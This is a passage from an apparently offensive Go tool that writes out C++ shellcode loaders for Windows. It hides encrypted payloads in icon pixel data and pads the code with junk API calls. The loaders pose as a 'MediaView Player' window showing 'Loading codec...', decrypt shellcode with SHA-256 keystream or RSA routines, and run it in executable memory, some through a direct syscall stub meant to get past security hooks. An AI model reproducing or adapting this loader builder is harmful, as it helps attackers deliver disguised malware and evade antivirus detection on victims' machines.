		"{volatile DWORD _tid=GetCurrentThreadId();volatile DWORD _pid=GetCurrentProcessId();(void)_tid;(void)_pid;}\n",
		"{HCURSOR _hc=LoadCursorW(NULL,IDC_ARROW);volatile BOOL _ok=(_hc!=NULL);(void)_ok;}\n",
		"{volatile UINT _cp=GetACP();volatile UINT _ocp=GetOEMCP();(void)_cp;(void)_ocp;}\n",
	}
	var b [1]byte
	rand.Read(b[:])
	start := int(b[0]) % len(blocks)
	var sb strings.Builder
	for i := 0; i < len(blocks); i++ {
		idx := (start + i) % len(blocks)
		sb.WriteString("    ")
		sb.WriteString(blocks[idx])
	}
	return sb.String()
}

func iconPayloadCapForSizes(sizes []int) int {
	cap := 0
	for _, s := range sizes {
		cap += s * s * 2
	}
	return cap
}

func pickIconTier(payloadLen int) []int {
	maxGroups := len(iconGroupNames)
	for _, tier := range iconSizeTiers {
		if payloadLen <= iconPayloadCapForSizes(tier)*maxGroups {
			return tier
		}
	}
	return iconSizeTiers[len(iconSizeTiers)-1]
}

func generatePayloadIcons(payload []byte) [][]byte {
	sizes := pickIconTier(len(payload))
	capPerGroup := iconPayloadCapForSizes(sizes)
	numGroups := 1
	if len(payload) > capPerGroup {
		numGroups = (len(payload) + capPerGroup - 1) / capPerGroup
	}
	icons := make([][]byte, numGroups)
	payOff := 0
	for g := 0; g < numGroups; g++ {
		var useSizes []int
		if g < numGroups-1 {
			useSizes = sizes
		} else {
			rem := len(payload) - payOff
			for _, s := range sizes {
				useSizes = append(useSizes, s)
				rem -= s * s * 2
				if rem <= 0 {
					break
				}
			}
		}
		numEntries := len(useSizes)
		dirSize := 6 + 16*numEntries
		type imgBlock struct {
			hdr    [40]byte
			pixels []byte
			andMsk []byte
		}
		imgs := make([]imgBlock, numEntries)
		for i, s := range useSizes {
			pixSz := s * s * 4
			andRow := ((s + 31) / 32) * 4
			andSz := andRow * s
			imgs[i].pixels = make([]byte, pixSz)
			imgs[i].andMsk = make([]byte, andSz)
			for j := 0; j < pixSz && payOff < len(payload); j += 4 {
				b1 := payload[payOff]
				payOff++
				imgs[i].pixels[j] = b1
				imgs[i].pixels[j+1] = 0x00
				b2 := byte(0)
				if payOff < len(payload) {
					b2 = payload[payOff]
					payOff++
				}
				imgs[i].pixels[j+2] = b2
				imgs[i].pixels[j+3] = 0xFF
			}
			hdr := imgs[i].hdr[:]
			hdr[0] = 40
			hdr[4] = byte(s)
			hdr[5] = byte(s >> 8)
			hx2 := s * 2
			hdr[8] = byte(hx2)
			hdr[9] = byte(hx2 >> 8)
			hdr[12] = 1
			hdr[14] = 32
		}
		offsets := make([]int, numEntries)
		off := dirSize
		for i := range imgs {
			offsets[i] = off
			off += 40 + len(imgs[i].pixels) + len(imgs[i].andMsk)
		}
		buf := make([]byte, off)
		buf[2] = 1
		buf[4] = byte(numEntries)
		for i, s := range useSizes {
			o := 6 + i*16
			w, h := s, s
			if w == 256 {
				w = 0
			}
			if h == 256 {
				h = 0
			}
			buf[o] = byte(w)
			buf[o+1] = byte(h)
			buf[o+4] = 1
			buf[o+6] = 32
			imgSz := 40 + len(imgs[i].pixels) + len(imgs[i].andMsk)
			buf[o+8] = byte(imgSz)
			buf[o+9] = byte(imgSz >> 8)
			buf[o+10] = byte(imgSz >> 16)
			buf[o+11] = byte(imgSz >> 24)
			buf[o+12] = byte(offsets[i])
			buf[o+13] = byte(offsets[i] >> 8)
			buf[o+14] = byte(offsets[i] >> 16)
			buf[o+15] = byte(offsets[i] >> 24)
		}
		for i := range imgs {
			pos := offsets[i]
			copy(buf[pos:pos+40], imgs[i].hdr[:])
			pos += 40
			copy(buf[pos:pos+len(imgs[i].pixels)], imgs[i].pixels)
			pos += len(imgs[i].pixels)
			copy(buf[pos:pos+len(imgs[i].andMsk)], imgs[i].andMsk)
		}
		icons[g] = buf
	}
	return icons
}

func oxuGenerateLoaderEclCallback(encodedData []byte, encSize, realSize int, key string, embedKey bool) string {
	var sb strings.Builder
	sb.WriteString("#include <windows.h>\n#include <cstdint>\n#include <cstring>\n#include <cstdlib>\n\n")
	sb.WriteString(callbackSemanticPad)
	sb.WriteString(callbackDynAPICpp())
	sb.WriteString(eclBCryptSHA256Cpp)
	useInflate := encSize != realSize
	if useInflate {
		sb.WriteString(inflateCpp)
	}
	writeResLoaderCode(&sb, encSize, realSize, 0)
	sb.WriteString("static LRESULT CALLBACK MediaWndProc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp){\n")
	sb.WriteString("    switch(msg){\n")
	sb.WriteString("    case WM_PAINT:{PAINTSTRUCT ps;HDC hdc=BeginPaint(hwnd,&ps);\n")
	sb.WriteString("        RECT rc;GetClientRect(hwnd,&rc);\n")
	sb.WriteString("        HBRUSH hBg=CreateSolidBrush(RGB(32,32,32));FillRect(hdc,&rc,hBg);DeleteObject(hBg);\n")
	sb.WriteString("        SetTextColor(hdc,RGB(200,200,200));SetBkMode(hdc,TRANSPARENT);\n")
	sb.WriteString("        DrawTextW(hdc,L\"Loading codec...\",-1,&rc,DT_CENTER|DT_VCENTER|DT_SINGLELINE);\n")
	sb.WriteString("        EndPaint(hwnd,&ps);return 0;}\n")
	sb.WriteString("    case WM_CLOSE:PostQuitMessage(0);return 0;\n")
	sb.WriteString("    }return DefWindowProcW(hwnd,msg,wp,lp);\n}\n\n")
	if embedKey {
		sb.WriteString(fmt.Sprintf("static const char g_key[] = \"%s\";\n\n", key))
		sb.WriteString("int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {\n")
		sb.WriteString("    volatile int _t = (int)strlen(g_CodecInfo); (void)_t;\n")
		sb.WriteString(callbackJunkBlock())
		sb.WriteString("    if(!_ra()) return 0;\n")
		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=MediaWndProc;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
		sb.WriteString("    RegisterClassExW(&wc);HWND hw=CreateWindowExW(0,L\"MediaViewPlayer\",L\"MediaView Player\",WS_OVERLAPPEDWINDOW,100,100,854,480,NULL,NULL,hInst,NULL);\n")
		sb.WriteString(callbackJunkBlock())
		sb.WriteString("    if(!InitCodecCache())return 0;\n")
		sb.WriteString("    const char* key = g_key;\n")
		sb.WriteString("    uint32_t klen = sizeof(g_key) - 1;\n\n")
	} else {
		sb.WriteString("extern \"C\" int __argc;\n")
		sb.WriteString("extern \"C\" wchar_t** __wargv;\n\n")
		sb.WriteString("int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {\n")
		sb.WriteString("    volatile int _t = (int)strlen(g_CodecInfo); (void)_t;\n")
		sb.WriteString(callbackJunkBlock())
		sb.WriteString("    if(!_ra()) return 0;\n")
		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=MediaWndProc;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
		sb.WriteString("    RegisterClassExW(&wc);HWND hw=CreateWindowExW(0,L\"MediaViewPlayer\",L\"MediaView Player\",WS_OVERLAPPEDWINDOW,100,100,854,480,NULL,NULL,hInst,NULL);\n")
		sb.WriteString(callbackJunkBlock())
		sb.WriteString("    if(!InitCodecCache())return 0;\n")
		sb.WriteString("    if (__argc != 2) return 0;\n")
		sb.WriteString("    char keyBuf[256];\n")
		sb.WriteString("    int ki=0;while(__wargv[1][ki]&&ki<255){keyBuf[ki]=(char)__wargv[1][ki];ki++;}keyBuf[ki]=0;\n")
		sb.WriteString("    const char* key = keyBuf;\n")
		sb.WriteString("    uint32_t klen = 0; while (key[klen]) klen++;\n\n")
	}
	sb.WriteString(callbackJunkBlock())
	sb.WriteString("    uint8_t _sd[32], _ks[32];\n")
	sb.WriteString("    ecl_sha256((const uint8_t*)key, klen, _sd);\n")
	sb.WriteString("    uint32_t _ko = 32;\n")
	sb.WriteString(fmt.Sprintf("    for(uint32_t _off = 0; _off < g_enc_size; _off++) {\n        if(_ko >= 32) { ecl_sha256(_sd, 32, _sd); memcpy(_ks, _sd, 32); _ko = 0; }\n        _codecBuf[_off] ^= _ks[_ko++];\n    }\n"))
	sb.WriteString("    memset(_sd, 0, 32); memset(_ks, 0, 32);\n\n")
	sb.WriteString("    LPVOID _mem = _a.fVA(NULL, g_real_size, 0x3000, 0x04);\n")
	sb.WriteString("    if(!_mem) return 0;\n")
	if useInflate {
		sb.WriteString("    _inf(_codecBuf, g_enc_size, (uint8_t*)_mem, g_real_size);\n")
	} else {
		sb.WriteString("    memcpy(_mem, _codecBuf, g_enc_size);\n")
	}
	sb.WriteString("    free(_codecBuf); _codecBuf = NULL;\n")
	sb.WriteString("    DWORD _op = 0;\n")
	sb.WriteString("    _a.fVP(_mem, g_real_size, 0x20, &_op);\n")
	sb.WriteString("    ((void(*)())_mem)();\n")
	sb.WriteString("    return 0;\n}\n")
	return sb.String()
}

func oxuGenerateLoaderRsaCallback(encryptedShellcode []byte, encSize, realSize int, privateKey string, embedKey bool) string {
	var sb strings.Builder
	sb.WriteString("#include <windows.h>\n#include <cstring>\n#include <string>\n#include <cstdint>\n#include <cstdlib>\n")
	sb.WriteString("#include \"RSA.h\"\n\n")
	sb.WriteString(callbackSemanticPad)
	sb.WriteString(callbackDynAPICpp())
	writeResLoaderCode(&sb, encSize, realSize, 0)
	sb.WriteString("static LRESULT CALLBACK MediaWndProc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp){\n")
	sb.WriteString("    switch(msg){\n")
	sb.WriteString("    case WM_PAINT:{PAINTSTRUCT ps;HDC hdc=BeginPaint(hwnd,&ps);\n")
	sb.WriteString("        RECT rc;GetClientRect(hwnd,&rc);\n")
	sb.WriteString("        HBRUSH hBg=CreateSolidBrush(RGB(32,32,32));FillRect(hdc,&rc,hBg);DeleteObject(hBg);\n")
	sb.WriteString("        SetTextColor(hdc,RGB(200,200,200));SetBkMode(hdc,TRANSPARENT);\n")
	sb.WriteString("        DrawTextW(hdc,L\"Loading codec...\",-1,&rc,DT_CENTER|DT_VCENTER|DT_SINGLELINE);\n")
	sb.WriteString("        EndPaint(hwnd,&ps);return 0;}\n")
	sb.WriteString("    case WM_CLOSE:PostQuitMessage(0);return 0;\n")
	sb.WriteString("    }return DefWindowProcW(hwnd,msg,wp,lp);\n}\n\n")
	if embedKey {
		escapedKey := strings.ReplaceAll(privateKey, `\`, `\\`)
		sb.WriteString(fmt.Sprintf("static const char g_private_key[] = \"%s\";\n\n", escapedKey))
		sb.WriteString("int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {\n")
		sb.WriteString("    volatile int _t = (int)strlen(g_CodecInfo); (void)_t;\n")
		sb.WriteString(callbackJunkBlock())
		sb.WriteString("    if(!_ra()) return 0;\n")
		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=MediaWndProc;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
		sb.WriteString("    RegisterClassExW(&wc);HWND hw=CreateWindowExW(0,L\"MediaViewPlayer\",L\"MediaView Player\",WS_OVERLAPPEDWINDOW,100,100,854,480,NULL,NULL,hInst,NULL);\n")
		sb.WriteString(callbackJunkBlock())
		sb.WriteString("    if(!InitCodecCache())return 0;\n")
		sb.WriteString("    std::string key(g_private_key);\n\n")
	} else {
		sb.WriteString("extern \"C\" int __argc;\n")
		sb.WriteString("extern \"C\" wchar_t** __wargv;\n\n")
		sb.WriteString("int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {\n")
		sb.WriteString("    volatile int _t = (int)strlen(g_CodecInfo); (void)_t;\n")
		sb.WriteString(callbackJunkBlock())
		sb.WriteString("    if(!_ra()) return 0;\n")
		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=MediaWndProc;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
		sb.WriteString("    RegisterClassExW(&wc);HWND hw=CreateWindowExW(0,L\"MediaViewPlayer\",L\"MediaView Player\",WS_OVERLAPPEDWINDOW,100,100,854,480,NULL,NULL,hInst,NULL);\n")
		sb.WriteString(callbackJunkBlock())
		sb.WriteString("    if(!InitCodecCache())return 0;\n")
		sb.WriteString("    if (__argc != 2) return 0;\n")
		sb.WriteString("    char keyBuf[1024];\n")
		sb.WriteString("    int ki=0;while(__wargv[1][ki]&&ki<1023){keyBuf[ki]=(char)__wargv[1][ki];ki++;}keyBuf[ki]=0;\n")
		sb.WriteString("    std::string key(keyBuf);\n\n")
	}
	sb.WriteString(callbackJunkBlock())
	sb.WriteString("    LPVOID _mem = _a.fVA(NULL, g_real_size, 0x3000, 0x04);\n")
	sb.WriteString("    if(!_mem) return 0;\n")
	sb.WriteString("    std::DecryptShell(_pd, g_enc_size, (uint8_t*)_mem, g_real_size, key);\n")
	sb.WriteString("    free(_pd); _pd = NULL;\n")
	sb.WriteString("    DWORD _op = 0;\n")
	sb.WriteString("    _a.fVP(_mem, g_real_size, 0x20, &_op);\n")
	sb.WriteString("    ((void(*)())_mem)();\n")
	sb.WriteString("    return 0;\n}\n")
	return sb.String()
}

func oxuGenerateLoaderEclX64(encodedData []byte, encSize, realSize int, key string, embedKey bool) string {
	var sb strings.Builder
	sb.WriteString("#include <windows.h>\n#include <cstdint>\n#include <cstring>\n\n")
	sb.WriteString("typedef LONG NTSTATUS;\n")
	sb.WriteString("typedef NTSTATUS (NTAPI *pfnNtAllocateVirtualMemory)(\n")
	sb.WriteString("    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,\n")
	sb.WriteString("    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);\n\n")
	sb.WriteString(eclBCryptSHA256Cpp)
	eclWriteEncData(&sb, encodedData, encSize, realSize)
	eclWriteRevTable(&sb, key)
	eclWriteKeyAndDecode(&sb, embedKey, key)
	sb.WriteString(`    unsigned char sc_stub[] = {
        0x4C, 0x8B, 0xD1, 0xB8, 0x18, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3
    };
    LPVOID stub_mem = VirtualAlloc(NULL, sizeof(sc_stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!stub_mem) return 1;
    memcpy(stub_mem, sc_stub, sizeof(sc_stub));
    pfnNtAllocateVirtualMemory pNtAlloc = (pfnNtAllocateVirtualMemory)stub_mem;
    PVOID base_addr = NULL;
    SIZE_T region_size = g_real_size;
    pNtAlloc((HANDLE)-1, &base_addr, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    VirtualFree(stub_mem, 0, MEM_RELEASE);
    if (!base_addr) return 1;

    uint8_t* out = (uint8_t*)base_addr;
    for (uint32_t i = 0; i < g_real_size; i++) {
        if (ks_pos >= 32) { ecl_sha256(seed, 32, seed); memcpy(ks, seed, 32); ks_pos = 0; }
        out[i] = ((_rt[dG(2*i)]<<4)|_rt[dG(2*i+1)]) ^ ks[ks_pos++];
    }

    typedef void(*fptr)();
    volatile fptr _fn = (fptr)base_addr;
    _fn();
    return 0;
}
`)
	return sb.String()
}

func oxuGenerateLoaderEclX86(encodedData []byte, encSize, realSize int, key string, embedKey bool) string {
	var sb strings.Builder
	sb.WriteString("#include <windows.h>\n#include <cstdint>\n#include <cstring>\n")
	sb.WriteString("#include \"WindowsShellcodeInjector.h\"\n\n")
	sb.WriteString(eclBCryptSHA256Cpp)
	eclWriteEncData(&sb, encodedData, encSize, realSize)
	eclWriteRevTable(&sb, key)
	eclWriteKeyAndDecode(&sb, embedKey, key)
	sb.WriteString(`    WindowsShellCodeInvoke invoker;
    LPVOID shell_mem = invoker.VirtualAllocMemory(NULL, g_real_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shell_mem) return 1;

    uint8_t* out = (uint8_t*)shell_mem;
    for (uint32_t i = 0; i < g_real_size; i++) {
        if (ks_pos >= 32) { ecl_sha256(seed, 32, seed); memcpy(ks, seed, 32); ks_pos = 0; }
        out[i] = ((_rt[dG(2*i)]<<4)|_rt[dG(2*i+1)]) ^ ks[ks_pos++];
    }

    typedef void(*fptr)();
    volatile fptr _fn = (fptr)shell_mem;
    _fn();
    return 0;
}
`)
	return sb.String()
}

func oxuGenerateLoaderX64(encryptedShellcode []byte, encSize, realSize int, privateKey string, embedKey bool) string {
	var sb strings.Builder
	sb.WriteString(`#include <windows.h>
#include <cstring>
#include <string>
#include <cstdint>
#include "RSA.h"

typedef LONG NTSTATUS;
typedef NTSTATUS (NTAPI *pfnNtAllocateVirtualMemory)(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

`)
	oxuWriteEncData(&sb, encryptedShellcode, encSize, realSize)
	oxuWriteKeyHandling(&sb, embedKey, privateKey)
	sb.WriteString(`    unsigned char sc_stub[] = {
        0x4C, 0x8B, 0xD1,
        0xB8, 0x18, 0x00, 0x00, 0x00,
        0x0F, 0x05,
        0xC3
    };

    LPVOID stub_mem = VirtualAlloc(NULL, sizeof(sc_stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!stub_mem) return 1;
    memcpy(stub_mem, sc_stub, sizeof(sc_stub));

    pfnNtAllocateVirtualMemory pNtAlloc = (pfnNtAllocateVirtualMemory)stub_mem;
    PVOID base_addr = NULL;
    SIZE_T region_size = g_real_size;
    pNtAlloc((HANDLE)-1, &base_addr, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    VirtualFree(stub_mem, 0, MEM_RELEASE);
    if (!base_addr) return 1;

    uint8_t* _eb = new uint8_t[g_enc_size]; dR(_eb);
    std::DecryptShell(_eb, g_enc_size, (uint8_t*)base_addr, g_real_size, key);
    delete[] _eb;

    typedef void(*shellcode_func)();
    ((shellcode_func)base_addr)();

    return 0;
}
`)
	return sb.String()
}

func oxuGenerateLoaderX86(encryptedShellcode []byte, encSize, realSize int, privateKey string, embedKey bool) string {
	var sb strings.Builder
	sb.WriteString(`#include <windows.h>
#include <cstring>
#include <string>
#include <cstdint>
#include "RSA.h"
#include "WindowsShellcodeInjector.h"

`)
	oxuWriteEncData(&sb, encryptedShellcode, encSize, realSize)
	oxuWriteKeyHandling(&sb, embedKey, privateKey)
	sb.WriteString(`    WindowsShellCodeInvoke invoker;
    LPVOID shell_mem = invoker.VirtualAllocMemory(NULL, g_real_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shell_mem) return 1;

    uint8_t* _eb = new uint8_t[g_enc_size]; dR(_eb);
    std::DecryptShell(_eb, g_enc_size, (uint8_t*)shell_mem, g_real_size, key);
    delete[] _eb;

    typedef void(*fptr)();
    volatile fptr _fn = (fptr)shell_mem;
    _fn();

    return 0;
}
`)
	return sb.String()
}
